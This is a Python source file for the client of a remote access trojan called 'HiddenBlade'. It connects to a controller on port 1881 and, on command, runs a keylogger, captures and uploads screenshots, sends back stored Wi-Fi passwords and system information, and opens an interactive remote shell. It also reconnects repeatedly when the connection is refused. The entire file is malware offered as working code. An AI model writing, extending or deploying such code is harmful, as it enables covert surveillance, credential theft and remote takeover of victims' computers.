from time import sleep
from threading import Thread
from util.hidden_blade_components import HiddenBladeComponent
import os
import socket
import sys

class Client(socket.socket):
    def __init__(self) -> None:
        super().__init__(socket.AF_INET,socket.SOCK_STREAM)
        self.connect(("",1881))
        Thread(target=self.comminication()).start()

    def comminication(self):
        cc = HiddenBladeComponent.ClientCommands()
        while(True):
            commands = self.recv(1024).decode()
            if commands == "get-info":
                self.send(str(cc.get_info()).encode())

            elif commands == "k-lgr":
                cc.makeKeylogger()
                self.send(b"Finish")
                with open("log.txt","r",encoding="utf-8") as f:
                    self.send(f.read().encode())
                os.remove("log.txt")

            elif commands == "get-screen_s":
                cc.screenShot()
                with open(f"{HiddenBladeComponent.test_konumu}ss.png","rb") as ss:
                    data = ss.read()
                    data_lenght = len(data)
                    self.send(data_lenght.to_bytes(4,'big'))
                    self.send(data)
                os.remove(f"{HiddenBladeComponent.test_konumu}ss.png")
                
            elif commands == "get-wifi-passw":
                self.send(str(cc.wifiChecked()).encode())
            
            elif commands == "i-shell":
                while True:
                    cmd = self.recv(1024).decode()
                    if cmd:
                        self.send(cc.terminalCommands(cmd).encode())
                    if cmd == "exit":
                        break
            elif commands == "exit":
                self.send(b"Im sleeping")
                sys.exit(0)
def main():
    try:
        Client()
    except ConnectionRefusedError:
        main()
        sleep(1)
main()
